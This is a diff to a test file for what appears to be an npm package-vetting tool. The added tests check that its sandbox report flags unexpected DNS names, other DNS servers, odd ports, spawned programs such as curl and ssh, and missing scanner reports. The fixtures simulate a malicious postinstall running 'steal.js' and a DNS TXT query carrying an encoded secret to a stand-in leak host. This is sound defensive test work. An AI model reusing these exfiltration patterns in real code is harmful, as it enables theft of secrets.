@@ -89,7 +89,8 @@ test("a quiet run reports the registry only and nothing left behind", { skip }, 
 test("a surprise shows: another host, a port, a program, a file, a process", { skip }, () => {
   const out = report({
     ...quiet,
-    meta: meta({ dns_install: 2 }),
+    // 192.0.2.1 is the system's own resolver here, so its port 53 is not remote traffic.
+    meta: `${meta({ dns_install: 2 })}resolvers=192.0.2.1\n`,
     "install.log": "> evil@1.0.0 postinstall\n> node steal.js\nadded 1 package\n",
     "dns.txt": dns("registry.npmjs.org") + dns("collect.example") + dns("late.example"),
     "install.trace":
@@ -109,7 +110,7 @@ test("a surprise shows: another host, a port, a program, a file, a process", { s
   assert.match(out, /^ {2}> node steal\.js$/m);
   assert.match(out, /^SANDBOX dns names during install: collect\.example registry\.npmjs\.org $/m);
   assert.match(out, /^SANDBOX dns names during start: late\.example $/m);
-  // Loopback, DNS (port 53) and port 0 are not remote traffic.
+  // Loopback, the system's resolver on port 53 and port 0 are not remote traffic.
   assert.match(
     out,
     /^SANDBOX install: 3 remote addresses; not on port 443: 203\.0\.113\.9 port 8080;2606:4700::6810:122 port 22;$/m,
@@ -354,9 +355,16 @@ function vetShare() {
     'if [ "${STUB_CI_EXIT:-0}" != "0" ]; then exit "$STUB_CI_EXIT"; fi',
     "mkdir -p node_modules/some-cli && echo new > node_modules/some-cli/index.js",
   ]);
-  for (const scanner of ["osv-scanner", "gitleaks", "trivy"])
-    stub(root, scanner, [`echo "${scanner}" >> "$STUB_ROOT/calls.txt"`]);
-  stub(root, "boat", ['echo "boat" >> "$STUB_ROOT/calls.txt"', 'cat "$STUB_ROOT/boat.log"']);
+  // Each scanner stand-in writes an empty report where the real one does, unless told to
+  // write nothing (STUB_SCAN_SILENT), as a scanner that is missing or crashes would.
+  const said = (scanner) => `echo "${scanner}" >> "$STUB_ROOT/calls.txt"`;
+  const quietScan = 'if [ -n "${STUB_SCAN_SILENT:-}" ]; then exit 127; fi';
+  const fileAfter = (flag) =>
+    `while [ $# -gt 0 ]; do if [ "$1" = "${flag}" ]; then out="$2"; fi; shift; done`;
+  stub(root, "osv-scanner", [said("osv-scanner"), quietScan, 'echo "found 1 package" >&2', `echo '{"results":[]}'`]);
+  stub(root, "gitleaks", [said("gitleaks"), quietScan, fileAfter("--report-path"), 'echo "[]" > "$out"']);
+  stub(root, "trivy", [said("trivy"), quietScan, fileAfter("--output"), `echo '{"Results":[]}' > "$out"`]);
+  stub(root, "boat", ['echo "boat" >> "$STUB_ROOT/calls.txt"', 'cat "$STUB_ROOT/boat.log"', 'exit "${STUB_BOAT_EXIT:-0}"']);
   const calls = () => readFileSync(path.join(root, "calls.txt"), "utf8");
   return { root, calls, v: path.join(root, "share", "vetting", "tool-2.0.0") };
 }
@@ -384,4 +392,65 @@ test("a vetting run stops when the lockfile or the unpack fails", { skip }, () =
     assert.ok(!/osv-scanner|gitleaks|trivy|boat/.test(calls()), `a scanner ran after a failure:\n${calls()}`);
     assert.ok(!existsSync(path.join(v, "copy", "packages", "stale")), "the earlier copy was left in place");
   }
+});
+
+test("a scanner that wrote no report reads as no report, never as an earlier run's", { skip }, () => {
+  const { root, v } = vetShare();
+  mkdirSync(path.join(v, "out"), { recursive: true });
+  // Left from an earlier run of the same version: two findings and one finding.
+  writeFileSync(path.join(v, "out", "gitleaks.json"), '[{"RuleID":"old","File":"a"},{"RuleID":"old","File":"b"}]');
+  writeFileSync(path.join(v, "out", "trivy.json"), '{"Results":[{"Secrets":[{}]}]}');
+  const r = runIn(root, "pinned-vet.sh", ["tool", "some-cli", "2.0.0"], { STUB_SCAN_SILENT: "1" });
+  assert.match(r.out, /^OSV: no report$/m);
+  assert.match(r.out, /^GITLEAKS: no report$/m);
+  assert.match(r.out, /^TRIVY: no report$/m);
+  assert.ok(!r.out.includes("2 findings"), r.out);
+  assert.equal(r.status, 3, r.out);
+});
+
+test("a vetting run with no sandbox result does not exit 0", { skip }, () => {
+  const { root } = vetShare();
+  const r = runIn(root, "pinned-vet.sh", ["tool", "some-cli", "2.0.0"], { STUB_BOAT_EXIT: "1" });
+  assert.match(r.out, /^GITLEAKS: 0 findings$/m);
+  assert.match(r.out, /SANDBOX: no result \(exit 1\)/);
+  assert.notEqual(r.status, 0, r.out);
+});
+
+test("DNS is not a blind spot: other query types and other servers are reported", { skip }, () => {
+  const asked = (server, type, name) =>
+    `12:00:01.000001 eth0  Out IP 10.0.0.5.41234 > ${server}.53: 1+ ${type}? ${name}. (36)\n`;
+  const out = report({
+    ...quiet,
+    meta: `${meta({ dns_install: 3 })}resolvers=10.0.0.2\n`,
+    "dns.txt":
+      asked("10.0.0.2", "A", "registry.npmjs.org") +
+      asked("10.0.0.2", "TXT", "c2VjcmV0.leak.example") +
+      asked("203.0.113.53", "A", "registry.npmjs.org"),
+    "install.trace": v4("104.16.1.34", 443) + v4("10.0.0.2", 53) + v4("203.0.113.53", 53),
+  });
+  assert.match(out, /^SANDBOX dns names during install: c2VjcmV0\.leak\.example \(TXT\) registry\.npmjs\.org $/m);
+  assert.match(out, /^SANDBOX dns servers asked other than the system's: 203\.0\.113\.53 $/m);
+  // The system resolver on port 53 is not remote traffic; another address on port 53 is.
+  assert.match(out, /^SANDBOX install: 2 remote addresses; not on port 443: 203\.0\.113\.53 port 53;$/m);
+  assert.match(report(quiet), /^SANDBOX dns servers asked other than the system's: $/m);
+});
+
+test("a program counts when strace split its start over two lines", { skip }, () => {
+  const out = report({
+    ...quiet,
+    "install.trace": [
+      '201 execve("/usr/bin/curl", ["curl", "http://x"], 0x7ffd /* 20 vars */ <unfinished ...>',
+      '202 execve("/usr/bin/node", ["node"], 0x7ffd /* 20 vars */) = 0',
+      "201 <... execve resumed>) = 0",
+      '203 execve("/usr/bin/wget", ["wget"], 0x7ffd /* 20 vars */ <unfinished ...>',
+      "203 <... execve resumed>) = -1 ENOENT (No such file or directory)",
+      '204 execve("/usr/bin/ssh", ["ssh"], 0x7ffd /* 20 vars */ <unfinished ...>',
+      "",
+    ].join("\n"),
+  });
+  const line = out.split("\n").find((l) => l.startsWith("SANDBOX install programs:"));
+  assert.match(line, /curl x1/, "a split start was not counted");
+  assert.match(line, /node x1/);
+  assert.match(line, /ssh x1/, "a start whose result never came is counted, to be safe");
+  assert.ok(!line.includes("wget"), "a failed start was counted");
 });
